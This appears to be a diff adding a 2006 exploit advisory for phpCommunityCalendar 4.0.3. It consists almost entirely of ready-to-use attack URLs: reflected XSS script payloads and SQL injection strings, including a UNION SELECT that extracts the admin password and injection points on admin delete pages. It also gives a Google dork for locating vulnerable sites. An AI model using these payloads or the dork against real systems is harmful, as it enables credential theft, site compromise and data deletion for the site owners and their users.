@@ -1,0 +1,43 @@
+##################################################################################
+#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<#
+##################################################################################
+#										 #
+#	 phpCommunityCalendar 4.0.3 Multiple Vulnerabilites		         #
+#										 #
+##################################################################################
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>#
+##################################################################################
+#										 #
+#  author      : X0r_1   							 #
+#  release     : 23.05.06							 #
+#  software    : http://www.appideas.com/	  				 #
+#  googledork  : "Calendar programming by AppIdeas.com" filetype:php   		 #
+#										 #
+##################################################################################
+
+XSS:
+
+http://[SERVER]/[PATH]/week.php?LoName=<script>alert('XSS')</script>
+
+http://[SERVER]/[PATH]/month.php?LoName=<script>alert('XSS')</script>
+
+http://[SERVER]/[PATH]/event.php?AddressLink="><script>alert('XSS')</script><"
+
+
+SQL Injections:
+
+http://[SERVER]/[PATH]/month.php?query=CalendarDetailsID=-1) UNION SELECT Password,0 FROM phpcalendar_adminusers WHERE AdminUserID = 1/*
+
+http://[SERVER]/[PATH]/day.php?query=CalendarDetailsID=-1) UNION SELECT Password,0 FROM phpcalendar_adminusers WHERE AdminUserID = 1/*
+
+http://[SERVER]/[PATH]/event.php?ID=(1=1) [SQL]
+
+http://[SERVER]/[PATH]/admin/delCalendar.php?CalendarDetailsID=x'[SQL]
+
+http://[SERVER]/[PATH]/admin/delAdmin.php?AdminUserID=x' [SQL]
+
+http://[SERVER]/[PATH]/admin/delAddress.php?EventLocationID=x' [SQL]
+
+http://[SERVER]/[PATH]/admin/delCategory.php?LocationID=x' [SQL]
+
+# milw0rm.com [2006-05-23]
